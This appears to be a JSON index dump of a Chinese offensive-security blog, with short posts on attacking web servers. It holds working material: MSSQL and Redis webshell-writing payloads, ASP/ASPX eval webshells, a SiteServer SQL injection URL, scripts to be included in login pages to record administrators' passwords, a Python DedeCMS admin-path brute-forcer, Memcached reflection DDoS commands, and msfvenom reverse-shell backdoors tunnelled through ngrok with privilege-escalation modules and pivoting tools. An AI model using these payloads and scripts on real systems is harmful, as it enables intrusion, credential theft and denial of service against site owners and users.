&apos;d:/web/1.bak&apos; with init--;insert into cmd (a) values (&apos;&lt;% eval request(1) %&gt;&apos;)--;backup log xxxx to disk = &apos;d:/web/2.asp&apos;-- 需要支持 Stacked Queries","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"getshell","slug":"getshell","permalink":"https://exp10it.cn/tags/getshell/"},{"name":"mssql","slug":"mssql","permalink":"https://exp10it.cn/tags/mssql/"}]},{"title":"siteserver SQL 注入","slug":"siteserver-sql-injection","date":"2018-03-09T16:00:00.000Z","updated":"2018-08-02T03:02:17.117Z","comments":true,"path":"2018/03/10/siteserver-sql-injection/","link":"","permalink":"https://exp10it.cn/2018/03/10/siteserver-sql-injection/","excerpt":"","text":"影响范围 siteserver &lt;= 3.6.5 Payload/siteserver/userRole/modal_UserView.aspx?UserName=a&#39; or[areaid]&gt;db_name()--","categories":[{"name":"cms-vul","slug":"cms-vul","permalink":"https://exp10it.cn/categories/cms-vul/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://exp10it.cn/tags/sql/"},{"name":"siteserver","slug":"siteserver","permalink":"https://exp10it.cn/tags/siteserver/"}]},{"title":"siteserver 管理员密码重置","slug":"siteserver-administrator-password-reset","date":"2018-03-09T16:00:00.000Z","updated":"2018-08-02T03:02:13.925Z","comments":true,"path":"2018/03/10/siteserver-administrator-password-reset/","link":"","permalink":"https://exp10it.cn/2018/03/10/siteserver-administrator-password-reset/","excerpt":"SiteServer CMS 是定位于中高端市场的 CMS 内容管理系统, 能够以最低的成本、最少的人力投入在最短的时间内架设一个功能齐全、性能优异、规模庞大并易于维护的网站平台. 后台 /siteserver 点击找回密码","text":"SiteServer CMS 是定位于中高端市场的 CMS 内容管理系统, 能够以最低的成本、最少的人力投入在最短的时间内架设一个功能齐全、性能优异、规模庞大并易于维护的网站平台. 后台 /siteserver 点击找回密码 随便输入 点击下一步 抓包 把 Answer 的值改为空 成功获取密码","categories":[{"name":"cms-vul","slug":"cms-vul","permalink":"https://exp10it.cn/categories/cms-vul/"}],"tags":[{"name":"exploit","slug":"exploit","permalink":"https://exp10it.cn/tags/exploit/"},{"name":"siteserver","slug":"siteserver","permalink":"https://exp10it.cn/tags/siteserver/"}]},{"title":"burp 脱裤技巧","slug":"burp-dump-tricks","date":"2018-03-06T16:00:00.000Z","updated":"2018-08-02T03:02:11.105Z","comments":true,"path":"2018/03/07/burp-dump-tricks/","link":"","permalink":"https://exp10it.cn/2018/03/07/burp-dump-tricks/","excerpt":"burp 的 intruder 默认只显示状态码和长度 脱裤需要获取到表与列的内容","text":"burp 的 intruder 默认只显示状态码和长度 脱裤需要获取到表与列的内容 在 intrunder - options 下有 Grep-Extract 添加一条正则 匹配 title 的内容 再次 start attack save - results table 只勾选添加的正则 弹窗 选择保存路径 文件后缀 txt","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"burp","slug":"burp","permalink":"https://exp10it.cn/tags/burp/"}]},{"title":"aspx bypass safedog","slug":"aspx-bypass-safedog","date":"2018-03-06T16:00:00.000Z","updated":"2018-08-02T03:02:06.997Z","comments":true,"path":"2018/03/07/aspx-bypass-safedog/","link":"","permalink":"https://exp10it.cn/2018/03/07/aspx-bypass-safedog/","excerpt":"","text":"原理未知 安全狗竟然查杀不了这么 nb 的 code 12&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(/*s*/ Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;","categories":[{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/categories/bypass/"}],"tags":[{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/tags/bypass/"},{"name":"aspx","slug":"aspx","permalink":"https://exp10it.cn/tags/aspx/"}]},{"title":"web 密码记录脚本","slug":"password-save-script","date":"2018-03-05T16:00:00.000Z","updated":"2018-08-02T03:02:02.365Z","comments":true,"path":"2018/03/06/password-save-script/","link":"","permalink":"https://exp10it.cn/2018/03/06/password-save-script/","excerpt":"写这些脚本主要是方便记录管理员的密码 通常为 md5+salt 或者为 强密码 无法解密 需要上传至 webshell 脚本均已在本地测试成功 在对应的 login 文件上 include 即可","text":"写这些脚本主要是方便记录管理员的密码 通常为 md5+salt 或者为 强密码 无法解密 需要上传至 webshell 脚本均已在本地测试成功 在对应的 login 文件上 include 即可 默认保存在同目录下的 pass.txt 记录所有 POST 变量 php123456789&lt;?phpif (isset($_POST))&#123; $f = fopen(&apos;pass.txt&apos;,&apos;a+&apos;); foreach ($_POST as $k=&gt;$v)&#123; fwrite($f,$k.&apos;:&apos;.$v.&quot;\\r\\n&quot;); &#125; fclose($f);&#125;?&gt; asp1234567891011&lt;%dim fs,fnameset fs=Server.CreateObject(&quot;Scripting.FileSystemObject&quot;)set fname=fs.OpenTextFile(server.mappath(&quot;pass.txt&quot;),8,true)For i = 1 To Request.Form.Countfname.WriteLine(&quot;&quot;&amp;Request.Form.Key(i)&amp;&quot;:&quot; &amp; Request.Form(Request.Form.Key(i)))Nextfname.Closeset fname=nothingset fs=nothing%&gt; aspx12345678910&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%@ import namespace=&quot;System.IO&quot; %&gt;&lt;%var filepath = Server.MapPath(&quot;pass.txt&quot;);var sw = new StreamWriter(filepath, true);for (var i = 0;i&lt;Request.Form.Count;i++)&#123;sw.WriteLine(Request.Form.Keys[i].ToString() + &quot;:&quot; + Request.Form[i].ToString());&#125;sw.Close();%&gt; php 包含为 include &#39;config.php&#39; asp 与 asp.net 为 &lt;!-- #include file=&quot;config.aspx&quot; --&gt;","categories":[{"name":"tools","slug":"tools","permalink":"https://exp10it.cn/categories/tools/"}],"tags":[{"name":"php","slug":"php","permalink":"https://exp10it.cn/tags/php/"}]},{"title":"http 头伪造 IP","slug":"http-header-ip","date":"2018-03-05T16:00:00.000Z","updated":"2018-08-02T03:01:59.545Z","comments":true,"path":"2018/03/06/http-header-ip/","link":"","permalink":"https://exp10it.cn/2018/03/06/http-header-ip/","excerpt":"http 头 伪造 ip 123456789Client-IP: 127.0.0.1X-Client-IP: 127.0.0.1X-Real-IP: 127.0.0.1True-Client-IP: 127.0.0.1X-Originating-IP: 127.0.0.1X-Forwarded-For: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Forwarded-Host: 127.0.0.1","text":"http 头 伪造 ip 123456789Client-IP: 127.0.0.1X-Client-IP: 127.0.0.1X-Real-IP: 127.0.0.1True-Client-IP: 127.0.0.1X-Originating-IP: 127.0.0.1X-Forwarded-For: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Forwarded-Host: 127.0.0.1 大多都跟反向代理有关 X-Originating-IP 主要出现在邮件头里 X-Forwarded-For 不多说 代理转发的 IP X-Real-IP 跟 X-Forwarded-For 类似 X-Remote-IP 和 X-Remote-Addr 远程主机的 IP 因为都是从脚本层获取的 所以可以进行伪造 Modify Header Value 插件 PHP $_SERVER 变量输出","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"header","slug":"header","permalink":"https://exp10it.cn/tags/header/"}]},{"title":"Redis getshell","slug":"redis-getshell","date":"2018-03-04T16:00:00.000Z","updated":"2018-08-02T03:01:53.429Z","comments":true,"path":"2018/03/05/redis-getshell/","link":"","permalink":"https://exp10it.cn/2018/03/05/redis-getshell/","excerpt":"Redis 是一个开源的使用 ANSI C 语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value 数据库, 并提供多种语言的 API. 利用 redis 获取 webshell 介绍redis 配置里有 dir 和 dbfilename dir 存储路径 dbfilename 存储文件名","text":"Redis 是一个开源的使用 ANSI C 语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value 数据库, 并提供多种语言的 API. 利用 redis 获取 webshell 介绍redis 配置里有 dir 和 dbfilename dir 存储路径 dbfilename 存储文件名 123456127.0.0.1:6379&gt; config get dir1) &quot;dir&quot;2) &quot;F:\\Redis&quot;127.0.0.1:6379&gt; config get dbfilename1) &quot;dbfilename&quot;2) &quot;dump.rdb&quot; save 保存 利用config set dir 路径config dbfilename 文件名set web 内容save 123456127.0.0.1:6379&gt; config set dir F:\\phpStudy\\WWWOK127.0.0.1:6379&gt; config set dbfilename &apos;info.php&apos;OK127.0.0.1:6379&gt; set web &apos;&lt;?php phpinfo() ?&gt;&apos;OK 另外 config set 不存在的 dir 会报错 12127.0.0.1:6379&gt; config set dir F:\\fakepath(error) ERR Changing directory: No such file or directory 可以写脚本爆破路径","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"getshell","slug":"getshell","permalink":"https://exp10it.cn/tags/getshell/"},{"name":"redis","slug":"redis","permalink":"https://exp10it.cn/tags/redis/"}]},{"title":"Memcached UDP 反射攻击","slug":"memcached-udp-reflex-attack","date":"2018-03-03T16:00:00.000Z","updated":"2018-08-02T03:01:46.245Z","comments":true,"path":"2018/03/04/memcached-udp-reflex-attack/","link":"","permalink":"https://exp10it.cn/2018/03/04/memcached-udp-reflex-attack/","excerpt":"Memcached 是一个高性能的分布式内存对象缓存系统, 用于动态 Web 应用以减轻数据库负载. 攻击者向端口 11211 上的 Memcached 服务器发送小字节请求. 由于 UDP 协议并未正确执行, 因此 Memcached 服务器并未以类似或更小的包予以响应, 而是以有时候比原始请求大数千倍的包予以响应.","text":"Memcached 是一个高性能的分布式内存对象缓存系统, 用于动态 Web 应用以减轻数据库负载. 攻击者向端口 11211 上的 Memcached 服务器发送小字节请求. 由于 UDP 协议并未正确执行, 因此 Memcached 服务器并未以类似或更小的包予以响应, 而是以有时候比原始请求大数千倍的包予以响应. 测试脚本 MemcacheDos 12345git clone https://github.com/Srar/MemcacheDos.gitcd MemcacheDosnpm install --unsafesudo su./node_modules/.bin/ts-node main.ts --list result.txt --ip 192.168.2.100 --port 80","categories":[{"name":"exploit","slug":"exploit","permalink":"https://exp10it.cn/categories/exploit/"}],"tags":[{"name":"exploit","slug":"exploit","permalink":"https://exp10it.cn/tags/exploit/"},{"name":"memcached","slug":"memcached","permalink":"https://exp10it.cn/tags/memcached/"}]},{"title":"dede 后台爆破","slug":"dede-directory-brute-exp","date":"2018-03-02T16:00:00.000Z","updated":"2018-08-02T03:01:41.549Z","comments":true,"path":"2018/03/03/dede-directory-brute-exp/","link":"","permalink":"https://exp10it.cn/2018/03/03/dede-directory-brute-exp/","excerpt":"在 Windows 里, 我们只需要知道文件所在目录, 通过 FindFirstFile winapi 函数就可以访问到文件. Example123456789101112131415161718192021&lt;?php// ./dedecms/favicon.icoif(@getimagesize($_GET[&apos;poc&apos;]))&#123; echo 1;&#125;else &#123; echo 0;&#125;?&gt;get:http://localhost/test.php?poc=./d&lt;/favicon.ico返回: 1http://localhost/test.php?poc=./a&lt;/favicon.ico返回: 0http://localhost/test.php?poc=./de&lt;/favicon.ico返回: 1http://localhost/test.php?poc=./ded&lt;/favicon.ico返回: 1","text":"在 Windows 里, 我们只需要知道文件所在目录, 通过 FindFirstFile winapi 函数就可以访问到文件. Example123456789101112131415161718192021&lt;?php// ./dedecms/favicon.icoif(@getimagesize($_GET[&apos;poc&apos;]))&#123; echo 1;&#125;else &#123; echo 0;&#125;?&gt;get:http://localhost/test.php?poc=./d&lt;/favicon.ico返回: 1http://localhost/test.php?poc=./a&lt;/favicon.ico返回: 0http://localhost/test.php?poc=./de&lt;/favicon.ico返回: 1http://localhost/test.php?poc=./ded&lt;/favicon.ico返回: 1 前两位需要爆破 会花一点时间 只适用于 windows 系统 Exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import requestsimport itertoolsimport sysdef dede_brute(url): characters = &apos;abcdefghijklmnopqrstuvwxyz0123456789_!~@$-+=()&apos; back_dir = &apos;&apos; flag = 0 url = url + &apos;/plus/diy.php&apos; data = &#123; &apos;_FILES[dede][tmp_name]&apos; : &apos;./../&#123;p&#125;&lt;&lt;/images/adminico.gif&apos;, &apos;_FILES[dede][name]&apos; : 0, &apos;_FILES[dede][size]&apos; : 0, &apos;_FILES[dede][type]&apos; : &apos;image/gif&apos; &#125; for num in range(1,7): if flag: break for pre in itertools.permutations(characters,num): pre = &apos;&apos;.join(list(pre)) data[&apos;_FILES[dede][tmp_name]&apos;] = data[&apos;_FILES[dede][tmp_name]&apos;].format(p=pre) print &apos;[*] testing&apos;,pre r = requests.post(url,data=data) if &apos;Upload filetype not allow !&apos; not in r.text and r.status_code == 200: flag = 1 back_dir = pre data[&apos;_FILES[dede][tmp_name]&apos;] = &apos;./../&#123;p&#125;&lt;&lt;/images/adminico.gif&apos; break else: data[&apos;_FILES[dede][tmp_name]&apos;] = &apos;./../&#123;p&#125;&lt;&lt;/images/adminico.gif&apos; print &apos;[+] prefix:&apos;,back_dir flag = 0 for i in range(30): if flag: break for ch in characters: if ch == characters[-1]: flag = 1 break data[&apos;_FILES[dede][tmp_name]&apos;] = data[&apos;_FILES[dede][tmp_name]&apos;].format(p=back_dir+ch) r = requests.post(url, data=data) if &apos;Upload filetype not allow !&apos; not in r.text and r.status_code == 200: back_dir += ch print &apos;[+] &apos;,back_dir data[&apos;_FILES[dede][tmp_name]&apos;] = &apos;./../&#123;p&#125;&lt;&lt;/images/adminico.gif&apos; break else: data[&apos;_FILES[dede][tmp_name]&apos;] = &apos;./../&#123;p&#125;&lt;&lt;/images/adminico.gif&apos; print &apos;[+] path:&apos;,back_dirif __name__ == &apos;__main__&apos;: if len(sys.argv) == 2: dede_brute(sys.argv[1]) else: print &apos;[*] usage: dede.py url&apos;","categories":[{"name":"cms-vul","slug":"cms-vul","permalink":"https://exp10it.cn/categories/cms-vul/"}],"tags":[{"name":"exploit","slug":"exploit","permalink":"https://exp10it.cn/tags/exploit/"},{"name":"dede","slug":"dede","permalink":"https://exp10it.cn/tags/dede/"}]},{"title":"msf webshell 提权","slug":"msf-webshell","date":"2018-02-23T16:00:00.000Z","updated":"2018-08-02T03:01:38.797Z","comments":true,"path":"2018/02/24/msf-webshell/","link":"","permalink":"https://exp10it.cn/2018/02/24/msf-webshell/","excerpt":"ngrok 内网穿透, 搭配 metasploit 可实现日遍全外网. ngrok.cc 注册账号 开通隧道 类型 tcp","text":"ngrok 内网穿透, 搭配 metasploit 可实现日遍全外网. ngrok.cc 注册账号 开通隧道 类型 tcp 下载客户端 我的是 linux arm 运行 ./sunny clientid xxxx 下面用 msfvenom 生成后门程序 msfvenom -p windows/meterpreter/reverse_tcp LHOST=free.ngrok.cc LPORT=端口 -f exe &gt; /tmp/test.exe 端口填之前开通隧道的远程端口 123456$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=free.ngrok.cc LPORT=端口 -f exe &gt; test.exeNo platform was selected, choosing Msf::Module::Platform::Windows from the payloadNo Arch selected, selecting Arch: x86 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 341 bytesFinal size of exe file: 73802 bytes 监听 msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset LHOST 0.0.0.0set LPORT 端口 端口填之前开通隧道的本地端口 0.0.0.0 是为了监听所有地址 12msf exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 0.0.0.0:4444 将生成的程序上传至服务器执行 成功反弹会话 12345678910111213141516msf exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 0.0.0.0:4444[*] Sending stage (179779 bytes) to 127.0.0.1[*] Meterpreter session 1 opened (127.0.0.1:4444 -&gt; 127.0.0.1:55460) at 2018-02-23 19:01:59 +0800meterpreter&gt; getuidServer username IIS APPPOOL\\baidumeterpreter&gt; sysinfoComputer: WIN-XXOOOS: Windows 2012 (Build 9200)Architecture: x64System Language: zh_CNDomain: WORKGROUPLogged on Users: 5Meterpreter: x86/windowsmeterpreter&gt; 本地提权 exp 在 exploit/windows/local/ 下 1234567891011121314151617msf exploit(multi/handler) &gt; use exploit/windows/local/ms use exploit/windows/local/ms10_015_kitrap0duse exploit/windows/local/ms10_092_schelevatoruse exploit/windows/local/ms11_080_afdjoinleafuse exploit/windows/local/ms13_005_hwnd_broadcastuse exploit/windows/local/ms13_053_schlampereiuse exploit/windows/local/ms13_081_track_popup_menuuse exploit/windows/local/ms13_097_ie_registry_symlinkuse exploit/windows/local/ms14_009_ie_dfsvcuse exploit/windows/local/ms14_058_track_popup_menuuse exploit/windows/local/ms14_070_tcpip_ioctluse exploit/windows/local/ms15_004_tswbproxyuse exploit/windows/local/ms15_051_client_copy_imageuse exploit/windows/local/ms15_078_atmfd_bof use exploit/windows/local/ms16_016_webdavuse exploit/windows/local/ms16_032_secondary_logon_handle_privesc use exploit/windows/local/ms_ndproxy","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"metasploit","slug":"metasploit","permalink":"https://exp10it.cn/tags/metasploit/"}]},{"title":"teamviewer 提权","slug":"teamviewer-priv","date":"2018-02-22T16:00:00.000Z","updated":"2018-08-02T03:01:33.597Z","comments":true,"path":"2018/02/23/teamviewer-priv/","link":"","permalink":"https://exp10it.cn/2018/02/23/teamviewer-priv/","excerpt":"TeamViewer 是一个能在任何防火墙和 NAT 代理的后台用于远程控制的应用程序, 桌面共享和文件传输的简单且快速的解决方案. teamviewer 连接的时候只需要 ID 和 密码 相对于其它远控来说有自己的服务器来实现内网穿透 tv.exe -o C:\\log.txt","text":"TeamViewer 是一个能在任何防火墙和 NAT 代理的后台用于远程控制的应用程序, 桌面共享和文件传输的简单且快速的解决方案. teamviewer 连接的时候只需要 ID 和 密码 相对于其它远控来说有自己的服务器来实现内网穿透 tv.exe -o C:\\log.txt 安装 teamviewer 客户端 连接","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"teamviewer","slug":"teamviewer","permalink":"https://exp10it.cn/tags/teamviewer/"}]},{"title":"reGeorg 内网穿透","slug":"regeorg-socks-proxy","date":"2018-02-21T16:00:00.000Z","updated":"2018-08-02T03:01:18.605Z","comments":true,"path":"2018/02/22/regeorg-socks-proxy/","link":"","permalink":"https://exp10it.cn/2018/02/22/regeorg-socks-proxy/","excerpt":"every office needs a tool like Georg 前面介绍了 ew 这款神器 不过没有一台 vps 就不能实现转发 reGeorg 是 reDuh 的升级版 使用的是 socks5 协议","text":"every office needs a tool like Georg 前面介绍了 ew 这款神器 不过没有一台 vps 就不能实现转发 reGeorg 是 reDuh 的升级版 使用的是 socks5 协议 首先将 tunnel 上传至服务器 本地运行 ./reGeorgSocksProxy.py -u http://www.baidu.com/tunnel.php -p 1080 1234567891011121314151617$ ./reGeorgSocksProxy.py -u http://www.baidu.com/tunnel.aspx -p 1080 _____ _____ ______ __|___ |__ ______ _____ _____ ______ | | | ___|| ___| || ___|/ \\| | | ___| | \\ | ___|| | | || ___|| || \\ | | | |__|\\__\\|______||______| __||______|\\_____/|__|\\__\\|______| |_____| ... every office needs a tool like Georg willem@sensepost.com / @_w_m__ sam@sensepost.com / @trowalts etienne@sensepost.com / @kamp_staaldraad[INFO] Log Level set to [INFO][INFO] Starting socks server [127.0.0.1:1080], tunnel at [http://www.baidu.com/tunnel.aspx][INFO] Checking if Georg is ready[INFO] Georg says, &apos;All seems fine&apos; 配置 proxychains sudo vim /etc/proxychains.conf 在 ProxyList 下增加代理 12345[ProxyList]# add proxy here ...# meanwile# defaults set to &quot;tor&quot;socks5 127.0.0.1 1080 通过代理运行程序 proxychains cmd 例如 1234567891011121314151617$ proxychains nmap -p 80,1433,3306 172.16.2.10 ProxyChains-3.1 (http://proxychains.sf.net)Starting Nmap 7.40 ( https://nmap.org ) at 2018-02-22 11:34 CST|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-172.16.2.10:80-&lt;&gt;&lt;&gt;-OK|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-172.16.2.10:3306-&lt;&gt;&lt;&gt;-OK|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-172.16.2.10:80-&lt;&gt;&lt;&gt;-OK|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-172.16.2.10:1433-&lt;&gt;&lt;&gt;-OKNmap scan report for 172.16.2.10Host is up (0.49s latency).PORT STATE SERVICE80/tcp open http1433/tcp open ms-sql-s3306/tcp open mysqlNmap done: 1 IP address (1 host up) scanned in 1.87 seconds 或者开一个 bash 12345678910$ proxychains bash ProxyChains-3.1 (http://proxychains.sf.net)$ nmap -sP 172.16.2.10Starting Nmap 7.40 ( https://nmap.org ) at 2018-02-22 11:35 CST|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-172.16.2.10:80-&lt;&gt;&lt;&gt;-OKNmap scan report for 172.16.2.10Host is up (0.31s latency).Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"tran","slug":"tran","permalink":"https://exp10it.cn/tags/tran/"}]},{"title":"termite 跳板机管理","slug":"termite-tool","date":"2018-02-21T16:00:00.000Z","updated":"2018-08-02T03:01:29.673Z","comments":true,"path":"2018/02/22/termite-tool/","link":"","permalink":"https://exp10it.cn/2018/02/22/termite-tool/","excerpt":"Termite 是一款跳板机管理工具, 支持多种平台, 跳板机间可相互连接, 支持正反向 shell, socks 代理, 端口转发. 程序分为 admin 和 agent 首先运行 agent agent -l port","text":"Termite 是一款跳板机管理工具, 支持多种平台, 跳板机间可相互连接, 支持正反向 shell, socks 代理, 端口转发. 程序分为 admin 和 agent 首先运行 agent agent -l port admin 连接 admin -c ip -p port agent 显示信息 输入 help 查看命令 show 查看拓补 W windows M MacOS L Linux 选择主机goto id 反弹 shellshell port netcat 连接 开启 socks 代理socks port 之后用 proxychians 连接 上传/下载文件upfile 1.txt 2.txtdownfile 1.txt 2.txt 我这失败了 应该是只支持 linux 端口转发lcxtran local-port ip remote-port 将目标服务器所在网段的某个 ip 的 remote-port 转发到本地的 local-port 添加拓补将其他主机加入拓补 agent -c agent-ip port 连接已有的 agent (之前的 agent -l port) 因为连接的是前面的 agent 所以 2W 在 1W 下面","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"tran","slug":"tran","permalink":"https://exp10it.cn/tags/tran/"}]},{"title":"Nmap Penetration","slug":"nmap-penetration","date":"2018-02-19T16:00:00.000Z","updated":"2018-08-02T03:01:16.309Z","comments":true,"path":"2018/02/20/nmap-penetration/","link":"","permalink":"https://exp10it.cn/2018/02/20/nmap-penetration/","excerpt":"The Nmap Scripting Engine (NSE) is one of Nmap’s most powerful and flexible features. 脚本分类1234567891011121314auth: 负责处理鉴权证书(绕开鉴权)的脚本broadcast: 在局域网内探查更多服务开启状况, 如 dhcp/dns/sqlserver 等服务brute: 提供暴力破解方式, 针对常见的应用如 http/snmp 等default: 使用 -sC 或 -A 选项扫描时候默认的脚本, 提供基本脚本扫描能力discovery: 对网络进行行更多的信息, 如 SMB 枚举 SNMP 查询等dos: 用于进行拒绝服务攻击exploit: 利用已知的漏洞入侵系统external: 利用第三方的数据库或资源, 例如进行 whois 解析fuzzer: 模糊测试的脚本, 发送异常的包到目标机, 探测出潜在漏洞intrusive: 入侵性的脚本, 此类脚本可能引发对方的 IDS/IPS 的记录或屏蔽malware: 探测目标机是否感染了病毒 开启了后门等信息safe: 此类与 intrusive 相反, 属于安全性脚本version: 负责增强服务与版本扫描 (Version Detection) 功能的脚本vuln: 负责检查目标机是否有常见的漏洞 (Vulnerability) , 如是否有 MS08-067","text":"The Nmap Scripting Engine (NSE) is one of Nmap’s most powerful and flexible features. 脚本分类1234567891011121314auth: 负责处理鉴权证书(绕开鉴权)的脚本broadcast: 在局域网内探查更多服务开启状况, 如 dhcp/dns/sqlserver 等服务brute: 提供暴力破解方式, 针对常见的应用如 http/snmp 等default: 使用 -sC 或 -A 选项扫描时候默认的脚本, 提供基本脚本扫描能力discovery: 对网络进行行更多的信息, 如 SMB 枚举 SNMP 查询等dos: 用于进行拒绝服务攻击exploit: 利用已知的漏洞入侵系统external: 利用第三方的数据库或资源, 例如进行 whois 解析fuzzer: 模糊测试的脚本, 发送异常的包到目标机, 探测出潜在漏洞intrusive: 入侵性的脚本, 此类脚本可能引发对方的 IDS/IPS 的记录或屏蔽malware: 探测目标机是否感染了病毒 开启了后门等信息safe: 此类与 intrusive 相反, 属于安全性脚本version: 负责增强服务与版本扫描 (Version Detection) 功能的脚本vuln: 负责检查目标机是否有常见的漏洞 (Vulnerability) , 如是否有 MS08-067 信息收集1234567891011ip-getlocation-*whoishttp-email-harvesthostmap-ip2hostsdns-brutemembase-http-infosmb-check-vulnshttp-stored-xsshttp-sql-injectionhttp-headershttp-sitemap-generator 数据库12345678910mysql-databasesmysql-variablesmysql-empty-passwordmysql-bruteoracle-brutems-sql-brutems-sql-empty-passwordms-sql-tablesms-sql-xp-cmdshellpgsql-brute 渗透测试1234567891011http-bruteftp-brutehttp-wordpress-brutehttp-joomla-brutepop3-brutesmb-brutevnc-brutesmtp-brutesnmp-netstatsnmp-processessnmp-brute","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"nmap","slug":"nmap","permalink":"https://exp10it.cn/tags/nmap/"}]},{"title":"python 实现单向链表","slug":"python-linked-list","date":"2018-02-18T16:00:00.000Z","updated":"2018-08-02T03:01:11.485Z","comments":true,"path":"2018/02/19/python-linked-list/","link":"","permalink":"https://exp10it.cn/2018/02/19/python-linked-list/","excerpt":"链表是一种物理存储单元上非连续、非顺序的存储结构, 数据元素的逻辑顺序是通过链表中的指针链接次序实现的. 介绍链表的基本单位为 node node 存储 data 和 next data: 数据 next: 指向下一个 node 的指针 插入单位为 n 的数据 时间复杂度为 O(1) 查找单位为 n 的数据 时间复杂度为 O(n)","text":"链表是一种物理存储单元上非连续、非顺序的存储结构, 数据元素的逻辑顺序是通过链表中的指针链接次序实现的. 介绍链表的基本单位为 node node 存储 data 和 next data: 数据 next: 指向下一个 node 的指针 插入单位为 n 的数据 时间复杂度为 O(1) 查找单位为 n 的数据 时间复杂度为 O(n) 代码node 1234567class Node(object): def __init__(self,data): self.data = data self.next = None def __repr__(self): return str(self.data) 链表 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384class Link(object): def __init__(self,head=None): self.head = Node(head) if head: self.length = 1 else: self.length = 0 def __len__(self): return self.length def __str__(self): current = 0 p = self.head item = &apos;[&apos; while current &lt;= self.length: item += &apos; &apos; + &apos;\\&apos;&apos; + str(p) + &apos;\\&apos;&apos; p = p.next current += 1 item += &apos; ]&apos; return item def __call__(self): current = 0 p = self.head while current &lt;= self.length: yield p p = p.next current += 1 def append(self,data): data = Node(data) if self.head == None: self.head = data else: p = self.head while p.next: p = p.next p.next,p.next.next = data,None self.length += 1 def pop(self): p = self.head while p.next: p = p.next pp = p pp = None self.length -= 1 def insert(self,index,data): data = Node(data) if index == 0: p = self.head self.head = data self.head.next = p else: current = 0 p = self.head while current &lt;= self.length: if current +1 == index: pp = p.next p.next = data p.next.next = pp break else: current += 1 p = p.next self.length += 1 def delete(self,index): if index == 0: self.head = self.head.next else: current = 0 p = self.head while current &lt;= self.length: if current + 1 == index: pp = p.next.next p.next = pp break else: current += 1 p = p.next self.length -= 1","categories":[{"name":"python","slug":"python","permalink":"https://exp10it.cn/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://exp10it.cn/tags/python/"}]},{"title":"EarthWorm 内网穿透","slug":"ew-network-penetration","date":"2018-02-17T16:00:00.000Z","updated":"2018-08-02T03:01:06.617Z","comments":true,"path":"2018/02/18/ew-network-penetration/","link":"","permalink":"https://exp10it.cn/2018/02/18/ew-network-penetration/","excerpt":"EW 是一套便携式的网络穿透工具, 具有 SOCKS v5服务架设和端口转发两大核心功能, 可在复杂网络环境下完成网络穿透. 一般进入内网有 正向代理 和 反向代理 两种方法 引用 redrain 大牛的话 正向代理是我们自己 (Lhost) 戴套 (proxy) 插进去, 反向代理是她 (Rhost) 主动通过上位 (proxy) 坐上来 (Lhost) 正向代理需要目标主机有公网 IP 反向代理则适用于被防火墙拦截的情况","text":"EW 是一套便携式的网络穿透工具, 具有 SOCKS v5服务架设和端口转发两大核心功能, 可在复杂网络环境下完成网络穿透. 一般进入内网有 正向代理 和 反向代理 两种方法 引用 redrain 大牛的话 正向代理是我们自己 (Lhost) 戴套 (proxy) 插进去, 反向代理是她 (Rhost) 主动通过上位 (proxy) 坐上来 (Lhost) 正向代理需要目标主机有公网 IP 反向代理则适用于被防火墙拦截的情况 正向代理目标主机ew -s ssocksd -l 1080 在本地架设 socks 5 服务器 监听 1080 端口 socks 客户端 Proxifier (windows) proxychains (linux) 连接成功后 显示信息 ping 通了目标主机的另外一块网卡 反向代理vpsew -s rcsocks -l 1080 -e 8888 将来自 8888 端口的请求转发至 1080 端口 目标主机ew -s rssocks -d ip -e 8888 连接指定 ip 并将数据转发至 8888 端口 成功后会提示 rssocks cmd_socket ok 同样 ping 通网卡","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"tran","slug":"tran","permalink":"https://exp10it.cn/tags/tran/"}]},{"title":"pstools 使用详解","slug":"pstools-usage","date":"2018-02-16T16:00:00.000Z","updated":"2018-08-02T03:01:03.261Z","comments":true,"path":"2018/02/17/pstools-usage/","link":"","permalink":"https://exp10it.cn/2018/02/17/pstools-usage/","excerpt":"pstools 是微软用于管理员更方便的管理服务器的工具套件 提供很多功能比如: 远程执行命令 远程停止进程 远程更改密码 远程关机 